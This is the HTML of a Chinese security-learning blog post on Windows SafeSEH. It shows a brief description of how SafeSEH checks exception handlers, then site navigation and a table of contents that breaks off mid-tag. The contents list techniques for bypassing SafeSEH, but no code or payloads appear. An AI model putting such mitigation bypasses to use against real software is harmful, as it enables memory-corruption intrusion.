<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>亡羊补牢：SafeSEH | 技术栈</title><meta name="description" content="SafeSEH 对异常处理的保护原理  SafeSEH的原理 在程序调用异常处理函数前，对要调用的异常处理函数进行一系列的有效性校验，当发现异常处理函数不可靠时终止异常处理函数的调用。SafeSEH 需要操作系统和编译器的双重支持，二者缺一都会降低 SafeSEH 的保护能力。  编译器在SafeSEH 机制中所做的工作 启用&#x2F;SafeSEH 链接选项后，编译器在编译程序的时候将程序所有的异常处"><meta property="og:type" content="article"><meta property="og:title" content="亡羊补牢：SafeSEH"><meta property="og:url" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/index.html"><meta property="og:site_name" content="技术栈"><meta property="og:description" content="SafeSEH 对异常处理的保护原理  SafeSEH的原理 在程序调用异常处理函数前，对要调用的异常处理函数进行一系列的有效性校验，当发现异常处理函数不可靠时终止异常处理函数的调用。SafeSEH 需要操作系统和编译器的双重支持，二者缺一都会降低 SafeSEH 的保护能力。  编译器在SafeSEH 机制中所做的工作 启用&#x2F;SafeSEH 链接选项后，编译器在编译程序的时候将程序所有的异常处"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605173356294.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605174009415.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605174617111.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605193524256.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605194838798.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605194942893.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605195648181.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605200429987.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606150709169.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606151129127.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606171712911.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606171616216.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220606172452434.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608211412069.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608211446531.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608210733817.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608212431019.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608214503431.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220608220337220.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609143555512.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609144122991.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609144659336.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609151230429.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609163404514.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609170143708.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609170723023.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609171116159.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609174416604.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609175749949.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609180802012.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609182557595.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609183731968.png"><meta property="og:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220609184806753.png"><meta property="article:published_time" content="2022-06-09T11:31:34.000Z"><meta property="article:modified_time" content="2022-06-09T11:34:04.555Z"><meta property="article:author" content="rgzzplus"><meta property="article:tag" content="SafeSEH"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/image-20220605173356294.png"><link rel="canonical" href="https://www.rgzzplus.com/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/index.html"><link rel="alternate" href="/atom.xml" title="技术栈" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet"><meta name="generator" content="Hexo 6.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/rgzz-zq" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">人工智障plus</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md"></h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Wuhan, China</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">首页</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">归档</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">分类</span></a></li><li class="menu-item menu-item-repository"><a href="/repository"><i class="icon icon-project"></i> <span class="menu-title">项目</span></a></li><li class="menu-item menu-item-links"><a href="/links"><i class="icon icon-friendship"></i> <span class="menu-title">友链</span></a></li><li class="menu-item menu-item-about"><a href="/about"><i class="icon icon-cup-fill"></i> <span class="menu-title">关于</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/rgzz-zq" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">公告</h3><div class="widget-body"><div id="board"><div class="content"><p>欢迎来到技术栈！</p></div></div></div></div><div class="widget"><h3 class="widget-title">分类</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/0day%E5%AE%89%E5%85%A8/">0day安全</a><span class="category-list-count">15</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA/">个人</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/">经验交流</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%A2%98%E5%BA%93-%E4%BD%9C%E4%B8%9A/">题库/作业</a><span class="category-list-count">2</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签</h3><div class="widget-body"><ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ASLR/" rel="tag">ASLR</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C++</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C%E5%92%8C%E6%8C%87%E9%92%88/" rel="tag">C和指针</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DEP/" rel="tag">DEP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GS/" rel="tag">GS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git/" rel="tag">Git</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HeapSpary/" rel="tag">HeapSpary</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LNMP/" rel="tag">LNMP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" rel="tag">Linux常用命令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SEHOP/" rel="tag">SEHOP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SafeSEH/" rel="tag">SafeSEH</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%A7%E5%85%A8/" rel="tag">linux命令行大全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E9%97%AE%E9%A2%98/" rel="tag">linux问题</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ollydebug/" rel="tag">ollydebug</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/task-struct/" rel="tag">task_struct</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/typora/" rel="tag">typora</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu/" rel="tag">ubuntu</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%AD%E5%9B%BD%E7%9F%A5%E7%BD%91/" rel="tag">中国知网</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BA%92%E6%96%A5%E9%94%81/" rel="tag">互斥锁</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/" rel="tag">信号量</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BC%8F%E6%B4%9E/" rel="tag">其它类型的漏洞</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%AB%AF/" rel="tag">内存大小端</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB/" rel="tag">内存攻击</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/" rel="tag">函数指针</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/" rel="tag">同步互斥</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A0%86/" rel="tag">堆</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B1%8F%E9%9A%9C/" rel="tag">屏障</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BB%BA%E7%AB%99/" rel="tag">建站</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BF%83%E8%B7%AF/" rel="tag">心路</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" rel="tag">攻防世界</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82%E8%B0%88/" rel="tag">杂谈</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%A1%E4%BB%B6%E5%8F%98%E9%87%8F/" rel="tag">条件变量</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%88/" rel="tag">栈</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" rel="tag">正则表达式</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/" rel="tag">汇编指令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%87%AA%E6%97%8B%E9%94%81/" rel="tag">自旋锁</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AF%BB%E5%86%99%E9%94%81/" rel="tag">读写锁</a><span class="tag-list-count">1</span></li></ul></div></div><div class="widget"><h3 class="widget-title">标签云</h3><div class="widget-body tagcloud"><a href="/tags/ASLR/" style="font-size:13px">ASLR</a> <a href="/tags/C/" style="font-size:13px">C++</a> <a href="/tags/C%E5%92%8C%E6%8C%87%E9%92%88/" style="font-size:13.5px">C和指针</a> <a href="/tags/DEP/" style="font-size:13px">DEP</a> <a href="/tags/GS/" style="font-size:13px">GS</a> <a href="/tags/Git/" style="font-size:13px">Git</a> <a href="/tags/HeapSpary/" style="font-size:13px">HeapSpary</a> <a href="/tags/LNMP/" style="font-size:13px">LNMP</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" style="font-size:13px">Linux常用命令</a> <a href="/tags/SEHOP/" style="font-size:13px">SEHOP</a> <a href="/tags/SafeSEH/" style="font-size:13px">SafeSEH</a> <a href="/tags/c/" style="font-size:13px">c</a> <a href="/tags/hexo/" style="font-size:13.5px">hexo</a> <a href="/tags/linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A4%A7%E5%85%A8/" style="font-size:13px">linux命令行大全</a> <a href="/tags/linux%E9%97%AE%E9%A2%98/" style="font-size:13px">linux问题</a> <a href="/tags/ollydebug/" style="font-size:13px">ollydebug</a> <a href="/tags/pwn/" style="font-size:13px">pwn</a> <a href="/tags/reverse/" style="font-size:13.5px">reverse</a> <a href="/tags/task-struct/" style="font-size:13px">task_struct</a> <a href="/tags/typora/" style="font-size:13px">typora</a> <a href="/tags/ubuntu/" style="font-size:14px">ubuntu</a> <a href="/tags/%E4%B8%AD%E5%9B%BD%E7%9F%A5%E7%BD%91/" style="font-size:13px">中国知网</a> <a href="/tags/%E4%BA%92%E6%96%A5%E9%94%81/" style="font-size:13px">互斥锁</a> <a href="/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/" style="font-size:13px">信号量</a> <a href="/tags/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BC%8F%E6%B4%9E/" style="font-size:13px">其它类型的漏洞</a> <a href="/tags/%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%AB%AF/" style="font-size:13px">内存大小端</a> <a href="/tags/%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB/" style="font-size:13px">内存攻击</a> <a href="/tags/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/" style="font-size:13px">函数指针</a> <a href="/tags/%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/" style="font-size:13px">同步互斥</a> <a href="/tags/%E5%A0%86/" style="font-size:14px">堆</a> <a href="/tags/%E5%B1%8F%E9%9A%9C/" style="font-size:13px">屏障</a> <a href="/tags/%E5%BB%BA%E7%AB%99/" style="font-size:13px">建站</a> <a href="/tags/%E5%BF%83%E8%B7%AF/" style="font-size:13px">心路</a> <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size:13.5px">攻防世界</a> <a href="/tags/%E6%9D%82%E8%B0%88/" style="font-size:13px">杂谈</a> <a href="/tags/%E6%9D%A1%E4%BB%B6%E5%8F%98%E9%87%8F/" style="font-size:13px">条件变量</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">栈</a> <a href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" style="font-size:13px">正则表达式</a> <a href="/tags/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/" style="font-size:13px">汇编指令</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size:14px">漏洞</a> <a href="/tags/%E8%87%AA%E6%97%8B%E9%94%81/" style="font-size:13px">自旋锁</a> <a href="/tags/%E8%AF%BB%E5%86%99%E9%94%81/" style="font-size:13px">读写锁</a></div></div><div class="widget"><h3 class="widget-title">归档</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">七月 2022</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">四月 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a><span class="archive-list-count">16</span></li></ul></div></div><div class="widget"><h3 class="widget-title">最新文章</h3><div class="widget-body"><ul class="recent-post-list list-unstyled"><li><div class="item-thumb"><a href="/2022/07/27/HeapSpary%E6%8A%80%E6%9C%AF%E5%8F%8A%E7%96%91%E9%97%AE/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/0day%E5%AE%89%E5%85%A8/">0day安全</a></p><p class="item-title"><a href="/2022/07/27/HeapSpary%E6%8A%80%E6%9C%AF%E5%8F%8A%E7%96%91%E9%97%AE/" class="title">HeapSpary技术及疑问</a></p><p class="item-date"><time datetime="2022-07-27T08:08:48.000Z" itemprop="datePublished">2022-07-27</time></p></div></li><li><div class="item-thumb"><a href="/2022/07/27/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></p><p class="item-title"><a href="/2022/07/27/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/" class="title">函数指针</a></p><p class="item-date"><time datetime="2022-07-27T07:57:50.000Z" itemprop="datePublished">2022-07-27</time></p></div></li><li><div class="item-thumb"><a href="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a></p><p class="item-title"><a href="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/" class="title">kali搭建pwn环境</a></p><p class="item-date"><time datetime="2022-07-27T07:32:48.000Z" itemprop="datePublished">2022-07-27</time></p></div></li><li><div class="item-thumb"><a href="/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReversing-x64Elf-100/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/CTF/">CTF</a></p><p class="item-title"><a href="/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReversing-x64Elf-100/" class="title">攻防世界Reversing-x64Elf-100</a></p><p class="item-date"><time datetime="2022-07-24T02:39:54.000Z" itemprop="datePublished">2022-07-24</time></p></div></li><li><div class="item-thumb"><a href="/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C666/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/CTF/">CTF</a></p><p class="item-title"><a href="/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C666/" class="title">攻防世界666</a></p><p class="item-date"><time datetime="2022-07-24T02:39:11.000Z" itemprop="datePublished">2022-07-24</time></p></div></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse in" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#safeseh-%E5%AF%B9%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%9A%84%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">SafeSEH 对异常处理的保护原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#safeseh%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">SafeSEH的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%99%A8%E5%9C%A8safeseh-%E6%9C%BA%E5%88%B6%E4%B8%AD%E6%89%80%E5%81%9A%E7%9A%84%E5%B7%A5%E4%BD%9C"><span class="toc-number">1.1.1.</span> <span class="toc-text">编译器在SafeSEH 机制中所做的工作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%9C%A8safeseh%E6%9C%BA%E5%88%B6%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">操作系统在SafeSEH机制中的作用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rtlisvalidhandler-%E9%83%BD%E5%81%9A%E4%BA%86%E5%93%AA%E4%BA%9B%E5%B7%A5%E4%BD%9C%E5%91%A2"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">RtlIsValidHandler() 都做了哪些工作呢？</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E7%BB%95%E8%BF%87-safeseh"><span class="toc-number">2.</span> <span class="toc-text">攻击返回地址绕过 SafeSEH</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%99%9A%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87-safeseh"><span class="toc-number">3.</span> <span class="toc-text">利用虚函数绕过 SafeSEH</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8E%E5%A0%86%E4%B8%AD%E7%BB%95%E8%BF%87-safeseh"><span class="toc-number">4.</span> <span class="toc-text">从堆中绕过 SafeSEH</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AA%E5%90%AF%E7%94%A8-safeseh-%E6%A8%A1%E5%9D%97%E7%BB%95%E8%BF%87-safeseh"><span class="toc-number">5.</span> <span class="toc-text">利用未启用 SafeSEH 模块绕过 SafeSEH</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 